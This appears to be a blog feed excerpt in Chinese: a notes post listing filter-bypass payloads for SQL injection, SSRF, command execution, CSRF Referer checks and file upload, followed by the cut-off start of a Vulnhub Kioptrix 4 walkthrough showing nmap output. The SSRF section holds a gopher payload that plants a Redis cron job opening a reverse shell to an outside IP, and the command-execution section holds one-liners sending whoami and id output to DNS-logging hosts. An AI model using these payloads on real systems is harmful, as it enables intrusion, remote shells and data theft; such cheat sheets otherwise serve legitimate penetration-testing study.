    <content type="html"><![CDATA[<!-- ttoc --><h2><span id="sql注入">SQL注入</span></h2><h4><span id="十六进制绕过引号">十六进制绕过引号</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">slect table_name from information_schema.table where table_schema=&quot;sqli&quot;;</span><br><span class="line"></span><br><span class="line">slect table_name from information_schema.table where table_schema=0x73716c69;</span><br><span class="line"></span><br><span class="line">slect table_name from information_schema.table where table_schema=CHAR(115, 113, 108, 105);</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/sqli_1.png" alt=""></p><h4><span id="like或者in绕过等号">like或者in绕过等号</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id in (1,2,3,4);</span><br><span class="line"></span><br><span class="line">select * from admin where id like 1;</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/sqli_2.png" alt=""></p><h4><span id="join绕过逗号">join绕过逗号</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin where id = 1 union select 1,2,group_concat(user(),&apos; &apos;,database(),&apos; &apos;,@@datadir)</span><br><span class="line"></span><br><span class="line">SELECT * FROM admin where id = 1 union select * from ((select 1)A join (select 2)B join (select group_concat(user(),&apos; &apos;,database(),&apos; &apos;,@@datadir))C)</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/sqli_3.png" alt=""></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/sqli_4.png" alt=""></p><h4><span id="limit逗号的绕过">limit逗号的绕过</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from admin limit 0,2;</span><br><span class="line"></span><br><span class="line">select * from admin limit 2 offset 0;</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/sqli_5.png" alt=""></p><h4><span id="between绕过等号">between绕过等号</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id between 1 and 3;</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/sqli_6.png" alt=""></p><h4><span id="空格绕过">空格绕过</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id=1;</span><br><span class="line"></span><br><span class="line">select/**/*/**/from/**/admin/**/where/**/id=1;</span><br><span class="line"></span><br><span class="line">select/*1*/*from/*1*/admin/*1*/where/*1*/id=1;</span><br><span class="line"></span><br><span class="line">select*fromadminwhereid=1;</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/sqli_7.png" alt=""></p><h4><span id="符号代替文字绕过">符号代替文字绕过</span></h4><ul><li><p>&amp;&amp;代替and</p></li><li><p>||代替or</p></li><li><p>| 代替 xor</p></li></ul><h4><span id="mysql注释">MySQL注释</span></h4><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/sqli_8.png" alt=""></p><p>SELECT * FROM Users WHERE id =’1’AND MID(VERSION()1,1)=’5’;</p><h4><span id="等价函数替换">等价函数替换</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">hex()、bin() ==&gt; ascii()</span><br><span class="line"> </span><br><span class="line">sleep() ==&gt;benchmark()</span><br><span class="line"> </span><br><span class="line">concat_ws()==&gt;group_concat()</span><br><span class="line"> substr((select &apos;password&apos;),1,1) = 0x70</span><br><span class="line"> </span><br><span class="line">　　　strcmp(left(&apos;password&apos;,1), 0x69) = 1</span><br><span class="line"> </span><br><span class="line">　　   strcmp(left(&apos;password&apos;,1), 0x70) = 0</span><br><span class="line"> </span><br><span class="line">　　　strcmp(left(&apos;password&apos;,1), 0x71) = -1</span><br><span class="line">mid()、substr() ==&gt; substring()</span><br><span class="line"> </span><br><span class="line">@@user ==&gt; user()</span><br><span class="line"> </span><br><span class="line">@@datadir ==&gt; datadir()</span><br></pre></td></tr></table></figure><h2><span id="ssrf">SSRF</span></h2><h3><span id="限制协议绕过">限制协议绕过</span></h3><p>通过HTTP(S)的链接302跳转到gopher协议上。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$schema = $_GET[&apos;s&apos;];</span><br><span class="line">$ip     = $_GET[&apos;i&apos;];</span><br><span class="line">$port   = $_GET[&apos;p&apos;];</span><br><span class="line">$query  = $_GET[&apos;q&apos;];</span><br><span class="line">if(empty($port))&#123;  </span><br><span class="line">    header(&quot;Location: $schema://$ip/$query&quot;); </span><br><span class="line">&#125; else &#123;</span><br><span class="line">    header(&quot;Location: $schema://$ip:$port/$query&quot;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># dict protocol - 探测Redis</span><br><span class="line">dict://127.0.0.1:6379/info  </span><br><span class="line">curl -vvv &apos;http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=dict&amp;i=127.0.0.1&amp;port=6379&amp;query=info&apos;</span><br><span class="line"></span><br><span class="line"># file protocol - 任意文件读取</span><br><span class="line">curl -vvv &apos;http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=file&amp;query=/etc/passwd&apos;</span><br><span class="line"></span><br><span class="line"># gopher protocol - 一键反弹Bash</span><br><span class="line"># * 注意: gopher跳转的时候转义和`url`入参的方式有些区别</span><br><span class="line">curl -vvv &apos;http://sec.com:8082/ssrf_only_http_s.php?url=http://sec.com:8082/302.php?s=gopher&amp;i=127.0.0.1&amp;p=6389&amp;query=_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0  </span><br><span class="line">a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20&gt;&amp;%20/dev/tcp/103.21.140.84/6789%200&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d  </span><br><span class="line">%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3</span><br><span class="line">%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&apos;</span><br></pre></td></tr></table></figure><h3><span id="ip限制绕过">IP限制绕过</span></h3><h4><span id="利用">利用[::]</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">利用[::]绕过localhost</span><br><span class="line">http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1</span><br></pre></td></tr></table></figure><p>在windows尝试了<code>chrome Firefox IE</code>都无法访问</p><p>在Linux下<code>Firefox</code>是可以访问的。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/ssrf_1.png" alt=""></p><p>Linux下<code>curl wget</code>也是可以访问的。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/ssrf_2.png" alt=""></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/ssrf_3.png" alt=""></p><h4><span id="利用">利用@</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com@127.0.0.1   =&gt;  http://127.0.0.1</span><br></pre></td></tr></table></figure><p>在<code>firefox</code>下会弹出提示框。<code>chrome</code>直接跳转。</p><h4><span id="利用短地址">利用短地址</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dwz.cn/11SMa  &gt;&gt;&gt;  http://127.0.0.1</span><br></pre></td></tr></table></figure><h4><span id="利用xipio和xipname">利用xip.io和xip.name</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">10.0.0.1.xip.io 10.0.0.1</span><br><span class="line"></span><br><span class="line">www.10.0.0.1.xip.io 10.0.0.1</span><br><span class="line"></span><br><span class="line">mysite.10.0.0.1.xip.io 10.0.0.1</span><br><span class="line"></span><br><span class="line">foo.bar.10.0.0.1.xip.io 10.0.0.1</span><br><span class="line">10.0.0.1.xip.name  resolves to  10.0.0.1</span><br><span class="line"></span><br><span class="line">www.10.0.0.2.xip.name  resolves to  10.0.0.2</span><br><span class="line"></span><br><span class="line">foo.10.0.0.3.xip.name  resolves to  10.0.0.3</span><br><span class="line"></span><br><span class="line">bar.baz.10.0.0.4.xip.name  resolves to  10.0.0.4</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/ssrf_4.png" alt=""></p><h4><span id="利用dns解析">利用DNS解析</span></h4><p>在域名上设置A记录，指向127.0.1</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/ssrf_5.png" alt=""></p><h4><span id="利用进制转换">利用进制转换</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">十进制 ---||||||&gt; 十六进制 ---||||||&gt; 八进制 然后在访问时 指定协议然后加个0</span><br><span class="line"></span><br><span class="line">http://0[八进制] 比如 115.239.210.26 首先用.分割数字 115 239 210 26 然后选择10进制转换16进制！</span><br><span class="line"></span><br><span class="line">(要用0来表示前缀，可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样！)</span><br><span class="line"></span><br><span class="line">首先把这四段数字给 转成 16 进制！结果：73 ef d2 1a  然后把 73efd21a 这十六进制一起转换成8进制！</span><br><span class="line"></span><br><span class="line">结果：16373751032</span><br><span class="line"></span><br><span class="line">然后指定协议 http:// 用0表示前缀 加上结果 链接：</span><br><span class="line"></span><br><span class="line">http://0016373751032</span><br></pre></td></tr></table></figure><h4><span id="利用enclosed-alphanumerics">利用Enclosed alphanumerics</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">利用Enclosed alphanumerics</span><br><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com</span><br><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/ssrf_6.png" alt=""></p><h4><span id="利用句号">利用句号</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127。0。0。1  &gt;&gt;&gt;  127.0.0.1</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/ssrf_7.png" alt=""></p><h2><span id="命令执行">命令执行</span></h2><h4><span id="空格绕过">空格绕过</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt; 符号</span><br><span class="line"></span><br><span class="line">%09 符号</span><br><span class="line"></span><br><span class="line">IFS$9 符号</span><br><span class="line"></span><br><span class="line">$&#123;IFS&#125; 符号</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/cat_1.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%0a 符号</span><br><span class="line"></span><br><span class="line">%0d 符号</span><br><span class="line"></span><br><span class="line">%09 符号</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/cat_2.png" alt=""></p><h4><span id="变量形式绕过">变量形式绕过</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=who;b=am;c=i;$a$b$c</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/cat_3.png" alt=""></p><h4><span id="base64编码">base64编码</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`echo &quot;d2hvYW1p&quot;|base64 -d`</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/cat_4.png" alt=""></p><h4><span id="dns通道获取回显">DNS通道获取回显</span></h4><p>linux:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl xxxx.ceye.io/`whoami`</span><br><span class="line"></span><br><span class="line">ping -c 1 `whoami`.xxxx.ceye.io</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/dns_1.png" alt=""></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/dns_2.png" alt=""></p><p>特殊字符或者是空格出现的话，这时候可以通过一些编码来，比如base64</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://xxxx.ceye.io/$(id|base64)</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/dns_3.png" alt=""></p><p>windows:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http请求：</span><br><span class="line">for /F %x in (&apos;whoami&apos;) do start http://xxx.ceye.io/%x</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/dns_4.png" alt=""></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/dns_5.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dns请求：</span><br><span class="line">获取计算机名：for /F &quot;delims=&quot; %i in (&apos;whoami&apos;) do ping -n 1 %i.t00ls.xxx.tu4.org</span><br><span class="line">获取用户名：for /F &quot;delims= tokens=2&quot; %i in (&apos;whoami&apos;) do ping -n 1 %i.t00ls.xxx.tu4.org</span><br></pre></td></tr></table></figure><p>用<code>ceye.io</code>获取不到回显，尝试了用t00ls的<code>T00ls DNSLOG</code></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/dns_6.png" alt=""></p><h4><span id="单引号和双引号">单引号和双引号</span></h4><p>单引号双引号要成对出现</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bash_1.png" alt=""></p><h2><span id="csrf-绕过referer">CSRF 绕过Referer</span></h2><p>条件限制 不一定所有的Refere验证就可以绕过</p><h4><span id="referer为空条件下">Referer为空条件下</span></h4><p>利用ftp://,<a href="http://,https://,file://,javascript:,data:这个时候浏览器地址栏是file://开头的" target="_blank" rel="noopener">http://,https://,file://,javascript:,data:这个时候浏览器地址栏是file://开头的</a></p><p>如果这个HTML页面向任何http站点提交请求的话，这些请求的Referer都是空的。</p><p>利用https协议  https向http跳转的时候Referer为空</p><h4><span id="判断referer是某域情况下绕过">判断Referer是某域情况下绕过</span></h4><p>比如你找的csrf是xxx.com  验证的referer是验证的*.xx.com  </p><p>可以找个二级域名 之后<img "csrf地址"="">  之后在把文章地址发出去 就可以伪造。</p><h4><span id="判断referer是否存在某关键词">判断Referer是否存在某关键词</span></h4><p>referer判断存在不存在google.com这个关键词  </p><p>在网站新建一个google.com目录 把CSRF存放在google.com目录,即可绕过 </p><h4><span id="判断referer是否有某域名">判断referer是否有某域名</span></h4><p>判断了Referer开头是否以126.com以及126子域名  不验证根域名为126.com </p><p>那么我这里可以构造子域名x.126.com.xxx.com </p><h2><span id="文件上传">文件上传</span></h2><h3><span id="解析漏洞">解析漏洞</span></h3><h4><span id="iis60解析漏洞">IIS6.0解析漏洞</span></h4><p>IIS6.0会把以下3种类型的文件会被IIS当作脚本文件(ASP、PHP、ASPX)来解析执行</p><ul><li><p>a.asp;.jpg</p></li><li><p>/a.asp/2018042500310015.jpg</p></li><li><p>a.cer、a.asa、a.cdx  IIS6.0会把这三种后缀当作ASP来执行。</p></li></ul><h4><span id="apache解析漏洞">Apache解析漏洞</span></h4><p>在低版本的Apache中，系统会从右向左识别后缀，直至找到一个可以识别的后缀，然后将文件以该可识别的后缀进行解析。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shell.php.v1.xxx</span><br><span class="line"></span><br><span class="line">-- 系统无法识别xxx后缀名，则判断v1后缀名</span><br><span class="line">-- 系统仍无法识别v1后缀名，则判断php后缀名</span><br><span class="line">-- 系统可识别php后缀名，则将文件作为PHP文件解析</span><br></pre></td></tr></table></figure><h4><span id="nginx解析漏洞">Nginx解析漏洞</span></h4><p>Nginx&lt;=0.8.37，在已上传到服务器的包含WEBSHELL代码的图片后面加上%00.php会将 /xx.jpg%00.php当作PHP文件来进行解析执行。</p><h4><span id="cgi解析漏洞">CGI解析漏洞</span></h4><p> CGI的解析漏洞主要影响IIS&gt;7.0 和 Nginx 这两个WEB容器，它的产生原因是因为PHP.ini中cgi.fix_pathinfo=1，从而导致把其他格式文件按照PHP脚本来进行解析执行。</p><p>  Payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://IP/图片马地址/a.php</span><br></pre></td></tr></table></figure><p>遇到这种环境，攻击者只需要找到一个上传点，然后上传一个图片马，然后访问图片构造Payload即可获取WEBSHELL。但此情景只能以PHP脚本解析执行文件。</p><h4><span id="客户端检测绕过javascript检测">客户端检测绕过（JavaScript检测）</span></h4><p>这类检测通常在上传页面里含有专门检测文件上传的javascript代码最常见的就是检测扩展名是否合法</p><p>可以用firebug之类的插件把它禁掉或者通过burp之类的代理工具进行绕过提交</p><p>用burp进行代理修改先将文件扩展名改成jpg</p><h4><span id="服务端检测绕过mime检测">服务端检测绕过（MIME检测）</span></h4><p>MIME验证是通过获取上传文件时数据包中Content-Type的值来判断文件是否合法的。以下是常见图片的后缀和Content-Type对应表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">后缀   Content-Type</span><br><span class="line"></span><br><span class="line">.jpg   image/jpeg</span><br><span class="line">.gif   image/gif</span><br><span class="line">.png   image/png</span><br></pre></td></tr></table></figure><p>MIME验证只需要攻击者抓取上传数据包，将数据包中的Content-Type的值修改为合法图片的Content-Type值即可绕过。</p><h4><span id="服务端检测绕过目录路径检测">服务端检测绕过（目录路径检测）</span></h4><p>目录路径检测，一般就检测路径是否合法</p><p>洞成因是因为对目录路径的检测不够严谨而导致可以用0x00截断进行攻击</p><h4><span id="服务端检测绕过文件扩展名检测">服务端检测绕过(文件扩展名检测)</span></h4><ul><li><p>文件名大小写绕过</p></li><li><p>名单列表绕过</p></li><li><p>特殊文件名绕过</p></li><li><p>0x00截断绕过</p></li><li><p>htaccess文件攻击</p></li><li><p>解析调用/漏洞绕过</p></li></ul><h4><span id="服务端检测绕过文件内容检测">服务端检测绕过(文件内容检测)</span></h4><ul><li>文件幻数检测</li></ul><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/huanshu_1.png" alt=""></p><ul><li>文件相关信息检测</li></ul><p>图像文件相关信息检测常用的就是getimagesize()函数只需要把文件头部分伪造好就ok了，</p><p>就是在幻数的基础上还加了一些文件信息有点像下面的结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">(...somebinarydataforimage...)</span><br><span class="line">&lt;?phpphpinfo();?&gt;</span><br><span class="line">(...skippingtherestofbinarydata...)</span><br></pre></td></tr></table></figure><ul><li>文件加载检测</li></ul><p>常见的是图像渲染测试，再变态点的甚至是进行二次渲染</p><p>对渲染/加载测试的攻击方式是代码注入绕过</p><p>对二次渲染的攻击方式是攻击文件加载器自身</p><p>渲染/加载测试攻击-代码注入绕过</p><p>可以用图像处理软件对一张图片进行代码注入</p><p>用winhex看数据可以分析出这类工具的原理是</p><p>在不破坏文件本身的渲染情况下</p><p>找一个空白区进行填充代码，</p><p>一般会是图片的注释区对于渲染测试基本上都能绕过，毕竟本身的文件结构是完整的</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- ttoc --&gt;
&lt;h2&gt;&lt;span id=&quot;sql注入&quot;&gt;SQL注入&lt;/span&gt;&lt;/h2&gt;&lt;h4&gt;&lt;span id=&quot;十六进制绕过引号&quot;&gt;十六进制绕过引号&lt;/span&gt;&lt;/h4&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>Vulnhub渗透测试练习-Kioptrix 4</title>
    <link href="https://uknowsec.cn/posts/uncategorized/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%BB%83%E4%B9%A0-Kioptrix-4.html"/>
    <id>https://uknowsec.cn/posts/uncategorized/Vulnhub渗透测试练习-Kioptrix-4.html</id>
    <published>2018-05-17T05:46:30.000Z</published>
    <updated>2019-01-07T08:24:19.699Z</updated>
    
    <content type="html"><![CDATA[<!-- ttoc --><h3><span id="信息收集">信息收集</span></h3><p>用<code>nmap</code>进行端口扫描。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -sS -A 10.32.58.187</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-17 01:57 EDT</span><br><span class="line">Nmap scan report for 10.32.58.187</span><br><span class="line">Host is up (0.00037s latency).</span><br><span class="line">Not shown: 566 closed ports, 430 filtered ports</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)</span><br><span class="line">|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)</span><br><span class="line">80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</span><br><span class="line">|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch</span><br><span class="line">|_http-title: Site doesn&apos;t have a title (text/html).</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)</span><br><span class="line">MAC Address: 00:0C:29:38:2D:6F (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6</span><br><span class="line">OS details: Linux 2.6.9 - 2.6.33</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 10h00m00s, deviation: 2h49m43s, median: 7h59m59s</span><br><span class="line">|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Unix (Samba 3.0.28a)</span><br><span class="line">|   Computer name: Kioptrix4</span><br><span class="line">|   NetBIOS computer name: </span><br><span class="line">|   Domain name: localdomain</span><br><span class="line">|   FQDN: Kioptrix4.localdomain</span><br><span class="line">|_  System time: 2018-05-17T09:58:07-04:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">|_smb2-time: Protocol 